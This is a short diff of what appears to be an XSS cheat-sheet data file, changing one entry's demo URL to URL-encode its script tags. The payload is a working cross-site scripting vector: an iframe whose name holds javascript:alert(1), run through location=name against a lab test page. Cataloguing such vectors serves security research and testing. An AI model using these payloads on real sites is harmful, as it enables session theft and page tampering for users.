@@ -96,7 +96,7 @@
             "edge",
             "safari"
         ],
-        "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20name=javascript:alert(1)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D<script>location=name<\/script>%22%3E%3C%2Fiframe%3E"
+        "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20name=javascript:alert(1)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cscript%3Elocation=name%3C\/script%3E%22%3E%3C%2Fiframe%3E"
     },
     {
         "description": "No parentheses using template strings",
